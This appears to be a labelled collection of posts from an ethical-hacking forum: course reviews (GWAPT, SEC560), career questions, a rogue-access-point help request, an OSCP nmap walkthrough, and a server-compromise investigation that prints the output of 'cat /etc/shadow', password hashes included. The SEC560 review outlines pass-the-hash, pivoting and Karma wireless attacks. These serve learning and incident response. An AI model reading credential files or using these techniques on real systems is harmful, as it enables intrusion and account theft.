3;InterN0T shut down by their hosting provider 1and1ear eh-netters, during the last weekend (saturday between 13:46 and 14:01), most of intern0t was shut down by the security department at 1and1. (the hosting provider.)  the only thing the technical support could say at that time, was that the accounts were suspended due to a "security issue". the security department, didnt open until monday 09:00am est of course. at monday the 28th of november 2011, the security department at 1and1 informed me, that the account had been terminated and that i was no longer a customer at 1and1.  the reason for doing this, was because we hosted content that could be used to "hack". immediately i responded with that it was for ethical purposes only, but that didnt matter as all kinds of "hacking", are bad according to 1and1, especially their security department which you can reach at: +1 877 206 4253, in case you want discuss ethical hacking and penetration testing with them. after requesting a backup of all my files, the response was: "sir, your account has been terminated." (which the agent or whatever i talked to, kept repeating.) according to their terms and conditions, any kind of content 1and1 doesnt find appropriate (especially hacking), can result in any customers account being immediately terminated without warning. this includes deleting a domain you legally own, all your e-mail accounts, all files, databases, everything. some of you trying to reach intern0t.net will be redirected to: intern0t.blogspot.com  as this is the current place for updates concerning the website. for your information, ive been hosting content that could be used to "hack", on their servers for 5 years, without any problems whatsoever.  best regards, max
1;Scanning for missing Microsoft patcheswas wondering if anybody might be able to help explain this result. trend micro shows a computer is missing 3 security updates.  i log into the computer, check automatic updates, and its configured to run every night at 3am.  i run windows update and theres no updates pending.  i install microsoft baseline security analyzer 2.2 and scan the machine: 27 security updates missing, 3 service packs or update rollups are missing. i can see how trend micro may differ in scanning a windows machine for patches that are or arent installed, but i cant explain the difference between windows update and microsoft baseline security analyzer showing such varied results.  especially after reading this from the  mbsa 2.2 download page : built on the windows update agent and microsoft update infrastructure, mbsa ensures consistency with other microsoft management products including microsoft update (mu), windows server update services (wsus), systems management server (sms), system center configuration manager (sccm) 2007, and small business server (sbs). anybody have any ideas    im trying to get a patch management system implemented here, but the varying results from microsoft tools themselves isnt helping my case much haha

3;GWAPT with Live & OnDemand - reviewello guys,  as i already mentioned i was studying for sans gwapt. today the nightmare ended.  i did the live course with kevin johnson at the end of august, in ottawa. i can tell you that kevin is a good teacher, he has a lot of experience and he knows how to animate a class. the class was mixed, some were advanced in the field, others (like me) had some basic knowledge, and there were some who barely stayed awake. there is a lot of information in the course. some days are easier, but day 4 – client side discovery- was really difficult to digest. after the course i started to read the books, listen to the mp3’s, and i redid all the labs. after i read once all the books i did the ondemand questions. surprise  :) failed some chapters. the advantage with the questions from ondemand is that you can do them anytime you want, and you can repeat them. i did them until i pass all the questionnaires. i didnt used the books when i answered. some of the questions were easy, for some of them you could even get the answer from the books. there were some good questions that made you think a little bit. also, there was a repetition of some questions.  two weeks ago i did the first practice test. i scored 83%, and i finished the exam in one hour. it wasn’t very difficult. a little bit different than the ondemand, but ok. you could answer a lot of question just by looking in the book. yesterday i did the second practice exam. i scored 90% in about 50 minutes. almost 15% of the questions were similar with the ones in the first exam. i thought that i was smart  ;d and well prepared. this morning i sat for the real exam. what a difference  >:(        there are questions where you can find the answer in the books, but for most of them the answer is at the bottom of the page, where the details are.  the biggest difference was in the questions that presented you some code (html, php, javascript..) and you had to answer to some questions: - you intercepted this file through the proxy. which is your next step? - what file should you investigate giving the code?? - what attack can you perform giving the php code? - … they were very interesting and difficult (at least for me). i say difficult because the questions on ondemand and the practice exams made me believe that this is another theoretical exam, with some practical knowledge, but it was very “practical”.  in order to pass the exam, unless you are really experienced, you need: - the books  - to practice all the labs, to know the tools, and go the extra mile with the labs - to study hard i think that for someone with a web programmer background will be easier to understand the code in the exam, but there are other questions where you should have at least a basic knowledge about the whole it environment. for someone who wants to pass the exam i recommend to buy the course, and even buy the ondemand. do the questions on the ondemand without the manuals and you’ll be surprised  ::)  for the beginners in the web penetration testing i would recommend to start with something else (els maybe), because i don’t think they’ll have enough time to do it (unless they are geniuses or unemployed).  so, for the final exam i had 85% in 1h50 minutes, but i felt a carrot in my back during the exam  :p i am happy, and this was an interesting experience (this is my first sans)
0;Strange findings on a server compromised by perl.Bossworm (CVE-2010-0738).ve come across numerous servers over the past month which have been compromised by perl.bossworm (cve-2010-0738). all the servers had the same behaviour; they all had hundreds of instances of the pnscan port scanner running looking for jboss in the http headers of /16 address blocks and dumping them to /tmp. they all had the fly.pl, linda.pl, line.pl and other files associated with this worm all doing their thing. but one server which was running rhel 5.4 had some other strange behaviour which was not on the other servers and which ive never seen before. unfortunately this was the first server that id seen with this worm and so i did not think this behaviour strange until i noticed that the others were different. by the time i got suspicious my customer had already formatted and rebuilt their server so i cant do any futher investigating. the difference between the regular infections and this one all have to do with the passwd and shadow files;     code: [root@server1 bin]# cat /etc/shadow root:$1$gm9ykhcf$5scli2qg5qaojg64vlhbg.:15253:0:99999:7::: root:$1$gm9ykhcf$5scli2qg5qaojg64vlhbg.:15253:0:99999:7::: daemon:*:14672:0:99999:7::: adm:*:14672:0:99999:7::: lp:*:14672:0:99999:7::: sync:*:14672:0:99999:7::: shutdown:*:14672:0:99999:7::: halt:*:14672:0:99999:7::: mail:*:14672:0:99999:7::: news:*:14672:0:99999:7::: uucp:*:14672:0:99999:7::: operator:*:14672:0:99999:7::: games:*:14672:0:99999:7::: gopher:*:14672:0:99999:7::: ftp:*:14672:0:99999:7::: nobody:*:14672:0:99999:7::: nscd:!!:14672:0:99999:7::: vcsa:!!:14672:0:99999:7::: pcap:!!:14672:0:99999:7::: rpc:!!:14672:0:99999:7::: mailnull:!!:14672:0:99999:7::: smmsp:!!:14672:0:99999:7::: rpcuser:!!:14672:0:99999:7::: nfsnobody:!!:14672:0:99999:7::: sshd:!!:14672:0:99999:7::: dbus:!!:14672:0:99999:7::: haldaemon:!!:14672:0:99999:7::: avahi-autoipd:!!:14672:0:99999:7::: avahi:!!:14672:0:99999:7::: ntp:!!:14672:0:99999:7::: xfs:!!:14672:0:99999:7::: gdm:!!:14672:0:99999:7::: sabayon:!!:14672:0:99999:7::: hacluster:!!:14672:::::: admin:$1$5mq6luxu$h6e9e0am3s.uwk82spdnn/:15253:0:99999:7::: user:$1$unim0ekr$ysqyzteez1mok7uavdm1o.:15291:0:99999:7::: egg:$1$ktjwkcdt$ls8.xyik.ao4wqmdllbxn.:15264:0:99999:7:::   [root@server1 bin]# cat /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/bin/bash daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:ftp user:/var/ftp:/sbin/nologin nobody:x:99:99:nobody:/:/sbin/nologin nscd:x:28:28:nscd daemon:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin rpc:x:32:32:portmapper rpc user:/:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin rpcuser:x:29:29:rpc service user:/var/lib/nfs:/sbin/nologin nfsnobody:x:4294967294:4294967294:anonymous nfs user:/var/lib/nfs:/sbin/nologin sshd:x:74:74:privilege-separated ssh:/var/empty/sshd:/sbin/nologin dbus:x:81:81:system message bus:/:/sbin/nologin haldaemon:x:68:68:hal daemon:/:/sbin/nologin avahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin avahi:x:70:70:avahi daemon:/:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin xfs:x:43:43:x font server:/etc/x11/fs:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin sabayon:x:86:86:sabayon user:/home/sabayon:/sbin/nologin hacluster:x:90:90:heartbeat processes:/var/lib/heartbeat/cores/hacluster:/bin/bash admin:x:501:500:admin:/opt/admin:/bin/bash user:x:0:504::/home/user:/bin/bash egg:x:502:502::/home/egg:/bin/bash 1. a new user called "user" had been added with root privileges. 2. a new user called "egg" had been added. i presume this means an eggdrop had been installed. 3. the database user had been deleted. this is how i discovered that the server had been compromised in the first place. :-) 4. the application server user had been deleted. 5. the most curious thing (and the reason i opened this thread in the first place) is that the shadow file had 2 root users both with the same password hash and other properties, while passwd has only one root user. i suspect that this server was being used as a c&c master instead of a zombie which is why the additional users had been added (in particular the egg user). i dont quite understand why the cracker would want to delete the database and application server users as this immediately caused things to malfunction and caused the customer to open the support case. what i really want to know from the *nix gurus here is what effect having 2 root users in the shadow file has on the servers functionality and user authentication

3;Online Degree in Infosec - my experience @ Capellaread comments here and there about people looking at online information security/assurance programs, but i haven’t seen anyone do a really thorough write-up.  i’m currently attending capella university (one of the nsa listed ia programs) and will graduate with a bs in it with a specialization in information assurance this december.   i’ve decided to post this for anyone who may be considering capella or another online it/infosec program.   these are my opinions based on my experience.  others may have a different take. i would be interested in any feedback from others who have done online infosec programs.  i’m especially interested in details regarding the various ms programs; i’m planning to begin pursuing an ms in january, possibly at umuc.  i’ve also considered norwich, lewis university, james madison university and northeastern (expensive). about me:  i earned an a.a. from a community college in california, attended classes online at another cc, took some courses by distance from the university of leicester (uk) and attended law school for a year (despite not having a b.a. in hand yet).  i’ve been in it for ten years full-time and four years part-time before that.  i’ve worked as a programmer, network engineer, and manager.  i’ve never had a dedicated security job, but it’s been a primary interest for me.  i read a lot, i’ve published some papers, and i consider myself knowledgeable in the area.  the only certification i have is the security+. curriculum:   the curriculum is pretty solid.  currently, it requires lower division courses in databases, programming, networking, and web technologies.  i didn’t have to take any of those because of my prior coursework and work history so i don’t know what those classes are like.  some of my classmates really had trouble in software architecture (which has a weekly programming lab) so my suspicion is that the single programming course just isn’t adequate.  i’d rather see a two-semester lower division programming sequence.  i’d also like to see system administration (windows, linux, or both) as a core course in the it program.   the upper division coursework is split between general it courses (communications, software architecture, network architecture, project management, etc) and security courses (forensics, ethical hacking, security management, os security, application security, etc).  i don’t know that i’d change anything.  it would be nice to have a dedicated course in malware or wireless security, but i don’t think any of the current courses are wasted so this would really be a matter of swapping one elective for another to fit my interests/strengths. the courses do cover technical material, but there is a strong emphasis on management and procedure.  if you want to be a vulnerability researcher, malware analyst, or application security guru, you’d be better of majoring in cs at another school.  this program is geared toward people who want to be in management or consulting roles that bridge the gap between the business and technical sides, not toward people who want to be in purely technical roles.  i’m in a low-end it management role right now and am hoping to snag a higher position as a security manager or it director down the road. academic quality: you get out what you put in.  the instructors are facilitators.  they participate in and comment on the discussions and are available to answer questions, but most of your learning takes place from assigned readings, labs, and training videos/lectures.  the textbooks are supplemented with outside articles, nist documents, short video lectures, chapters from other books (available electronically within the class), as well as training materials from courses from microsoft, ec-council and others.  i didn’t find the training materials very useful; i learn better from reading on my own and the training tends to provide less detail than a book.  the e-books are nice and help students avoid having to buy a second or third textbook.   the assigned readings are usually enough for you to do well on assignments and labs, but, as with any class, you’ll learn a lot more if you do additional testing/reading on your own. a lot of people had trouble with discrete math, but the school provides a tutor to lead a live supplemental instruction session every week and that seemed to help people a lot.  i didn’t use the supplemental sessions so i can’t comment first-hand.  i don’t know of any other courses with supplemental instruction. the labs are too step-by-step and don’t require enough critical thinking/deductive reasoning.  they can teach you some of the features of a tool, but won’t do a lot to help you to understand how to solve real-world problems using the tool. the papers sometimes focus on a purely academic question, but most of them are tied to a project scenario, i.e. creating an incident response plan for the fictional mega corp or designing a network architecture for happy health systems.  there is a grading matrix for each assignment.  if you read those ahead of time you will know what areas your paper needs to cover.   academic difficulty: the program is more work than i expected.  i already have strong technical skills so learning the material is easy, but the required work output is high.  most courses require you to write a paper every week and, in most of those, you’ll need to write 5-10 pages for a good grade.  occasionally, i write papers as short as 3-5 pages, but my average is about 12 pages and my longest single paper was about 20 pages.  the only course i took with consistently shorter papers was a literature course i needed to fulfill a missing requirement.  most courses require a final paper that is made up mostly of your previous papers with a small amount of new material.  my final papers have ranged from 35 to 68 pages. at capella, i write close to 100 pages of original material per course.  by contrast, i don’t think any of my community college classes required a paper longer than five pages.  i might have had to write a ten page paper somewhere along the line, but it was at least a rare event.  the most writing intensive courses i took outside capella were in archaeology and physical anthropology: i had to write five three-page papers and two in-class essays for both of those.  my wife attended a nearby state university and she says that she probably wasn’t required to write any papers longer than about ten pages and not more than five papers per course.    if your writing skills are poor or you have trouble organizing your thoughts on paper, this probably isn’t the program for you.   as a former software developer, i thought the programming assignments (for software architecture) were really easy.  some of my classmates who had little or no prior experience had a much harder time.  i think they should add another lower-division programming course so that the upper division programming assignments can be at a more appropriate level.  i don’t think the program would be too challenging for someone with no experience, but i recommend learning some java ahead of time if your work schedule will limit your study time during school. student services:  capella’s student services are decent.  i’ve never had a problem with academic advising.  i transferred in units from two different schools, placed out of a few pre-requisite courses based on professional experience (i didn’t get college credit for those), and also completed a “prior learning assessment” for two other courses (which i did get credit for).   all of this went smoothly.   i had a major financial aid problem one year when capella insisted that my fafsa was not completed.  after talking with a couple of financial aid advisers i was told to contact the fafsa people to get them to fix a problem that was supposedly on their end.  after several more calls with both sides i found an adviser at capella that was able to figure out the problem (on capella’s side) and i got the problem resolved.  it was extremely frustrating, but i haven’t had any problems before or since. final judgment: i think capella has been worth my time.  i haven’t grown my technical skills much, but i didn’t expect to.  for someone just starting out, the technical aspects of the program would be much harder.  i will leave with better management and planning skills.  management is challenging, but underrated.  it’s hard to plan, coordinate, organize, and document large projects.  capella has given me a lot of practice developing plans for various information security programs and i think it will come in handy for me
1;Requesting help with attack response...reetings everyone! i am seeking assistance in understanding and responding to what i believe to be a security breach in my home wireless lan.  while i am an experienced end-user, my networking experience has been largely limited to small lans and web servers. to preface the symptoms i will describe, it may be relevant to state that there is a certain individual who is relatively tech-savvy (although no hacker), who has motive to access personal information of mine. so, heres my laymans description of what has happened:  beginning approximately two weeks ago, i suddenly and inexplicably starting having difficulty with wireless connections to my fios network in my home.  specifically, clients would establish connections to the network, but were unable to access the internet and other network devices.  i also noted a significant decrease in signal strength, and encountered frequent disconnects that i had not before. assuming there was an error or misconfiguration with my hardware, i have spent hours on end resetting all of my network devices to default and rebuilding the lan, with no improvement in performance.  i have fios service in my home, so my primary gateway is the verizon-provided piece-of-crap actiontec modem/router.  it has a static ip provided by verizon, and is set to dish out ip addresses within the range of 192.168.1.100-192.168.1.200.  because the actiontec wireless signal is laughable, i installed an apple airport extreme dual-band n in front of the fios router.  i set up the airport to broadcast the wireless connection to the network, and disabled its dhcp server so that the fios router was the only device leasing ips.  i statically assigned the airport the address 192.168.1.2 (the fios router is set to the factory-default 192.168.1.1). my lan consists of a windows 7 professional desktop that is always powered on, two windows notebooks (win7pro & winxp pro), two linux notebooks (ubuntu 10.04 lts), a nas (wd mybook world), 6 ios devices (3 ipod touch, 2 iphone, 1 ipad2), and three airport express units.  obviously, my 3 verizon fios set-top boxes also connect as lan clients.  the win7 desktop, fios stps, and the nas are connected to the fios router via ethernet/coax; all other devices access the network wirelessly.  the only port configuration that was altered was a forward on port22 to my nas for remote sftp connections. of all things, it was an ios game that my daughter was playing that brought the issue to my attention.  i had agreed to let her purchase the app, but had great difficulty connecting to the itunes store on her ipod touch (a very common issue for all of our ios devices in the past 2 weeks).  after rebooting the ipod several times, i opened the wifi properties and noticed that her connection to my network was suspicious.  the device had been assigned an ip address beginning with 169.254…, and was using a different subnet (255.255.0.0, whereas my dhcp assigns 255.255.255.0).  additionally, there were no dns servers assigned, and obviously, she was not able to connect to the internet at all. after this discovery, i took a closer look at all clients on the network, and found that half of them had these bizarre ip assignments. in response, i reconfigured my airport extreme with new wlan settings, including a new ssid and password.  i also disabled broadcasting of the ssid.  i changed the settings on all of the clients and reset / reconfigured the airport express units.  immediately after making these changes, all connectivity problems vanished!  all clients connected to the wlan immediately, with very strong signals and no disconnects.  internet access is fast and consistent all around. now, for the suspicious part…  after reconfiguring the wlan, i noticed that a network with the same ssid i had been previously using is still broadcasting!  i have scoured my home from top-to-bottom, and can not imagine any device that should be broadcasting this network.  my theory (and i have no idea how plausible this is) is that someone within range of my home is broadcasting their own wlan using the same ssid i had been using, essentially "mocking" my ap.  as my  connectivity problems indicate, i think clients would occasionally connect to the rouge wlan instead of the legitimate one, and at times "bounce" between the two, causing the inconsistent connections and internet loss.  i should note that the ssid i had been using was very unique, so i am convinced that if someone else is broadcasting the same, it is not coincidental. as of 07:00 today (3/30/12), the "rogue" wlan is still broadcasting, and i have the following questions that i am hoping someone in this forum may be able to help me answer: 	1. since my former ssid was broadcast, i see how someone could obtain and replicate it, however the password used was very strong, unique to the wlan, and not shared (not even my wife or kids knew it, as i set up their ios devices for them).  if someone did set up a "phishing" wlan, would it possible to assign ips to my devices even though they all had passwords set?  could / would the fake wlan accept client connections without having matching passwords? 	2. what is the most reliable method of locating the device(s) that are still broadcasting the fake wlan?  if this truly is a malicious attack, i assume it wont be long before the attacker realizes he/she no longer has wireless clients. 	3. what, if any, personal information could have been compromised on my home lan?  im really not concerned about packet captures on the wireless clients, since they are primarily used for casual browsing / email, etc., however i do use my work (winxp) and personal (ubuntu) notebooks for confidential communication and banking.  neither of these notebooks are powered on when not in use.  the "always-on" windows desktop is only used for homework, itunes, facebook, etc. 	4. keeping in mind that i am no hacker, is there an easy way for me to learn anything about the fake wlan and its owners intentions?  i considered connecting to it with one of my notebooks and running aircrack or wireshark, but in all honestly, i wouldnt know the first thing about what to look at in the captured data. okay, so now im "that guy" who submits a novel for his first post in the forum - lol, but im really hoping someone can share some insight on this for me, and as i mentioned, i doubt the broadcast will continue once the admin realizes there are no more connections to it. thank you in advance for any advice you can offer, and for enduring my verbose description!!! cheers, kir
0;OSCP and Pentesting 101wanted to take some time to give those taking the oscp and similar exams, a bit of food for thought when taking these exams. the food will come via taking time to create a repeatable framework in order to perform necessary objectives on the road to "owning the box." be it windows, linux, bsd, the flavor is irrelevant. i urge anyone taking the exam to go over the ptes (penetration testing execution standard) as it more detailed than what you will see here. the oscp exam seems to eat up a lot of time for a lot of individuals taking the exam. time is crucial in this exam as you are going to be allotted 24 hours. in the real world, your sow will also have a cut off time. so how can you maximize your time without having your work all over the place. the answer is to create yourself a framework. in the following mindmap ( http://www.infiltrated.net/mgz/oscp.jpeg ), i have a target and the tasks i would take in trying to exploit the target. in the enumeration/identification step, i will begin with, but not rely on, nmap. i try to use p0f whenever possible since it offers a better mechanism of identifying a target. i try to use p0f especially when identifying webservers, since i can use a proxy server to connect without triggering anything out of the ordinary. in the following snippet, i will connect from my desktop (freebsd 9.0) to a forensic workstation i created using ubuntu, on port 80.     code: [root@kenji ~]# uname -a freebsd kenji 9.0-release freebsd 9.0-release #0: tue mar 20 10:42:10 edt 2012     root@kenji:/usr/obj/usr/src/sys/saru  i386 [root@kenji ~]# nmap -ss -p0 -sv -t2 -vvv 10.4.4.86 starting nmap 5.61test5 ( http://nmap.org ) at 2012-04-09 14:47 edt nse: loaded 16 scripts for scanning. initiating parallel dns resolution of 1 host. at 14:47 completed parallel dns resolution of 1 host. at 14:47, 0.03s elapsed dns resolution of 1 ips took 0.03s. mode: async [#: 3, ok: 0, nx: 1, dr: 0, sf: 0, tr: 1, cn: 0] initiating syn stealth scan at 14:47 scanning 10.4.4.86 [1000 ports] discovered open port 22/tcp on 10.4.4.86 discovered open port 80/tcp on 10.4.4.86 completed syn stealth scan at 14:54, 401.81s elapsed (1000 total ports) initiating service scan at 14:54 scanning 2 services on 10.4.4.86 completed service scan at 14:54, 6.38s elapsed (2 services on 1 host) nse: script scanning 10.4.4.86. nse: starting runlevel 1 (of 1) scan. nmap scan report for 10.4.4.86 host is up (0.00038s latency). scanned at 2012-04-09 14:47:38 edt for 409s not shown: 998 closed ports port   state service version 22/tcp open  ssh     openssh 5.8p1 debian 7ubuntu1 (protocol 2.0) 80/tcp open  http    apache httpd 2.2.20 ((ubuntu)) service info: os: linux; cpe: cpe:/o:linux:kernel read data files from: /usr/local/share/nmap service detection performed. please report any incorrect results at http://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 408.69 seconds            raw packets sent: 1000 (44.000kb) | rcvd: 1000 (40.008kb) nmap states this is ubuntu, what does p0f state?

1;Some Questions About Hacking/Security for beginnersello everyone  , well well how to start, i will try to make this short, so firstly i am an undergraduate student i did not graduate yet still one year to go, i took a gap-year to have some working experience (6 months left to go back to college), my major is electronics and computer engineering, so basically i do have a good background of how circuits works inside a computer, i have worked on couples of projects on how to build up a memory and install a command program inside a processor using c++, that’s on the electronic side it actually taught me how computers works from the inside i don’t really know if that would help me in the hacking field. on the computer section i learned how to program in java, so you could say am in between intermediate-advanced java programmer, also i studied networks, all the iso layers and how they interact together. now, i love computers mostly when it comes to secure/crack a system or what so ever, so my plan is to get a foot into security field after graduation... i have done a lot of reading on how to get a foot into security field; i have chosen “networks” for that. i have got no experience at all in hacking, actually i had few ones when i was 14, hacked my teachers computer to get final exams (only for the modules which i didn’t really think it would help me in future) using some noobs tools like sub7 when it was all over the internet back in the days, not a very good thing to do though. so what i am saying is i have no basic experience in hacking field at all and need to start from scratch. so here are some questions for you expert out there based on some reading  : -first , and as i mentioned i am trying to get into security field via networks, i have a good background of iso so decided to take the ccna course, is that a good start to get into the second level in network field? and would that be enough to move to network security?  -a hacker needs to have some programming skills, well i am only familiar with java and c++, and a little bit of assembly language... now here is the question, why does the hacker need to learn how to program? say to modify a source code? or to build up some tools? do i need to learn more programming languages? some of you mentioned python is a good one, do i need to learn it too? -operation systems: i believe i am familiar and have got the basic skills of dealing with windows and linux, the question is how deep do i have to know about them to become a good hacker? and the other one is do i have to have certifications on them just to prove that i got what it takes to companies when applying for a job even as a security “guy”, is “system administrator” the level required here? if yes can you mention some good books for that?  -hacking/security certifications, the topic that we all have talked a lot about  and still, well i really need your help on this one, now you know what knowledge do i have –programming – networking – electronics, i am absolutely noob at hacking, can you recommend a course that would get me starting with hacking? of course a network related hacking course that would get me into pen testing… etc i have been reading a lot about the hacking courses but i can’t tell which one suits me since am a beginner, my goal is to get started with a basic course that  would accept my entry  then move into a more advanced one. finally, let’s say i finished ccna, and i had about 6 months experience of working in networks, also i had a basic hacking certification, then i went back to college and finished my last year, do i have a good chance to work in security field as a beginner? i am reading scary stuff over here and there like do you really need 3-5 years or even 10! to get into security field in a company for example? i feel i am a little late on advancing my skills i’m 24 now    (old guy) remember… your answer could change the way i live   thanks a lot for now i might have more questions later on, and hey i love this forum and planning to be active on here! regards,
3;Quick SEC560 Reviewjust wanted to give a "quick" post about the sans simulcast reward from the december 2011 free giveaway: in december of 2011, donald donzai, founder of ethicalhacker.net, awarded me the prize of the sans560 course. in march of 2012, i attended the course using the vlive, online-based training from the sans institute. the training was attended by people who were at the sans course in orlando, florida or connected through vlive (virtual training lab). in addition, there were people who signed up using the ondemand and mentor program. the sans sec560: network penetration and ethical hacking course is set to teach you the skills of an ethical penetration tester.  it is a 6-day course that goes step-by-step with topics that are similar to the popular pentesting methodologies. the course roadmap consists of "planning and recon", "scanning", "exploitation","password attacks", "wireless attacks" and "web app attacks". they also have a capture the flag event on the last day of the course. in addition, the course is worth 36 cpe points towards security certifications such as the cissp and the c|eh. the course started on sunday and ended on friday, from 9 am to 5:30 pm.  one nice thing about the course is that it is available on-line for 6 months after the course ends. that is a major plus if you miss any of the course material that is broadcasted over the internet. about 10 days before the course began, i received a sans package in the mail. it contained 6 manuals of the coursework, 2 small pamphlets and 1 sans dvd full of software with vmware isos, cheatsheets and documents. we used most of items in the sans package during the entire course. the documents also included a "rules of engagement" and "scope" template. in addition, a sample penetration report is present on the dvd.   day 1 sunday march 25th planning and recon:   on day one, we were introduced to ed skoudis and his team. ed, well-known author and security expert, has over 15 years of offensive and defensive information security. he also had moderators that helped us if the sound or video went out during our vlive connection. we did have either sound or video problems everyday but it never lasted longer than 5 minutes.  it did not take away from the experience of the course. the moderators usually kept us informed of what was going on even if we could not see it or hear it.  we learned about the planning involved to be an effective ethical hacker and penetration tester. that includes creating a well-stocked lab and testing tools.  in addition, you should create a software toolbox, proper hardware and network infrastructure. ed skoudis spent some time on the format of a good penetration test and where a lot of testers have been failing in their pentest reports. ed illustrated that the two worst areas in most pentest reports are the executive summary (brief information meant for the company executives) and the methodology (which describes the process of the penetration test or ethical hacking engagement).  that was very helpful especially if i can avoid common mistakes in future pentest reports. also, an email was sent by sans to test our connection to the vlive video cast. i connected using linux and it had no problem running the java applet to see the video or audio from orlando. we also talked about the "rules of engagement" and "scope" when dealing with the customer. i really enjoyed this part of the day. we broke into teams to emulate the debriefing of a pentester and the client so we can choose the right questions for a customer.  it helps to determine if a client truly wants a pentest or a vulnerability assessment. it was a good lesson to learn that you should not assume the customer knows exactly what they want.  the rules of engagement was defined as how the penetration test will run and who should be involved in the whole testing process. also, the scope was described as the assets that you can target and which ones you cannot and should not attack. in addition, ed explained that you should have a limitation of liability and appropriate insurance especially if you are running your own security firm. the last point i want to mention is that you have to pay attention to not only the us laws, but also the laws of other countries. you may be breaking another countries laws during a penetration test if you are not careful. ed skoudis gave great effort to bring out this point. your target may be in another country, so you may have to consult with your lawyer to make sure the attacks you send do not break the laws of your targets country and the countries in between.   day 2 monday march 26th scanning:   on day two, the course focused on scanning a target environment. ed illustrated the importance of having an inventory of assets and their vulnerabilities. i think every student knew how important this was, but it becomes very apparent at the end of the course. it is very upsetting/frustrating when you are trying to exploit vulnerabilities and you do not have enough information to send an effective attack.  the course also described the tools that can be used for quality network scanning. some of the tools discussed were nessus, nmap, tcpdump, traceroute/tracert, scapy and netcat.  we went over some of the additional scripts that come with nmap. in addition, we got some insight into how ed feels about wireshark vs tcpdump. he explained that tcpdump is lighter, faster and has a smaller attack surface than wireshark.  there seems to be more exploits such as buffer overflows designed for wireshark. as a side note, i do want to mention that ed did spend time explaining that you want to use "safe" tools and scans for your penetration test. you do not want to be the cause of an inadvertent dos because you were not aware of what your tools are doing.  know your tools. also, he explained that you should have alternatives to your tools, in case, you cannot use them on the network you are testing. "what if netcat is not in that environment?  what would you do?" day 3 tuesday march 27th  exploitation:   on day three, we worked on exploitation and the infamous metasploit. we went thru the commands, exploits and payloads of the metasploit console and meterpreter.  if you have taken the oscp, you know a lot of this module already. it is still an enjoyable section in which you are bound to pick up something new. he walked us through setting up the database to connect with metasploit so you can keep records of machines and their vulnerabilities.  we also went through the auxillary section of metasploit which can be helpful at finding a vulnerability quickly in a network range of ip addresses.  also, a very important point ed made during this section was the "portfwd" command in metasploit. this is how you can setup "pivot" points into an organization to gain further access into additional machines. it can help bypass blocked ports and firewalls by getting inside the organization through just one host. we worked on windows commands since you may not have all your usual techniques/commands in the environment you find yourself in. the two commands we worked with were sc and wmic. we used the sc (service console) and the wmic commands usually to identify running services/processes and to stop them if they interferred with our progress.       day 4 wednesday march 28th password attacks:   on day four, the topic was password attacks. the main points of the password attacks are password guessing, password cracking and pass the hash. he split up the tools for password guessing and password cracking. for the former, he suggested hydra, cain, xhydra and maybe your own personal scripts. for the latter, he demonstrated the use of the tools pwdump, fgdump, cain (again), john the ripper (compiled for nt-hashes with sse2 functionality), and ophcrack (rainbow tables). some of these tools are just for extracting microsoft password hashes to crack later for passwords.  sidenote, ed mentioned you have to be careful here. when using a password guessing technique, you want to check if there is account lockout policies enabled on the client network. you start by asking the client directly and never just take their word on it. imagine using hydra on 10,000 accounts and locking 10,000 users out of their account during your pentest. it is an easy way to get fired.  another idea that ed skoudis stressed was that you may have to use multiple password crackers to extract passwords from hashes. we learned that windows and linux store their passwords differently. linux stores passwords in hashes that are actually salted. this adds another layer of defense since identical hashes may not have the same corresponding passwords unlike windows hashes. lastly, we were learning how devastating "passing the hash" can be once you have even one "good" password hash. we used the psexec exploit in metasploit to pass the password hashes. the whole time i was enjoying this sans topic, i was wishing that i had built the box from "http://pauldotcom.com/2010/10/your-password-cracking-system.html".         day 5 thursday march 29th wireless and web apps:   on day five, the course focused on two main topics, wireless attacks and web application attacks.  with wireless attacks, you want to make sure you have the right tools. you want the right wireless adapter cards, drivers, antennas, cables, cable connectors,  and gps receivers. you may need multiple tools and apps also.  you want to start sniffing traffic with multiple apps such as wireshark, tcpdump, aircrack-ng and kismet. there are also commercial tools such as wildpackets omnipeek. in addition, you want to know how to get your wireless cards in managed/monitor mode. in monitor mode, you can get your wireless card to listen to all packets coming in on the interface. also, we got a quick lesson in wireless, listen to josh wright. i caught a couple of his youtube videos [http://www.youtube.com/watch?v=eucecqjj24s], and he is definitely an expert in wireless penetration testing.  he is also starting a sans class called sans575: mobile device security and ethical hacking.  it is definitely worth a look imo. there are wireless tools on both windows and linux with their own pluses and minuses. you have cain, netstumbler and inssider with windows. with linux, you can use kismet, aircrack-ng, cowpatty, airpwn and airjack to name a few. you will probably have more luck if you use linux as your wireless penetration testing os. however, ed skoudis, kept reinforcing the point that you will want to use as many tools/techniques/os as possible to get the job done. as ed would say, just use both.   finally, ed also mentioned that not only should you attack the access point, but the clients as well. here is where he mentions karma with the help of metasploit.  you can attack clients whom are still sending out probe requests to their access points even though they are out of range of them. karma will pretend to be their access point and give dhcp to them. with metasploit, it will serve up a series of exploits for various vulnerable clients when they try to connect to the "new" access point.  when we moved on to web application attacks, we discussed nikto, zap proxy, xss, xsrf, command injection and sql injection.  all of these tools and techniques take advantage of vulnerabilities of a companys web site which usually are hosted on a companys network on the dmz.  most attacks, find flaws in 3 components and the way that they interact with each other: the logic of the web application on the web server, the web server and web browsers interactions, and the web server and databases interactions. we started with nikto and the various web tests it can perform. ed demonstrated that nikto used the trace method to discover xss and directory indexing for a "web application" from the course.   in addition, we went through various proxies such owasp zed attack proxy (zap), burp proxy, fiddler, w3af 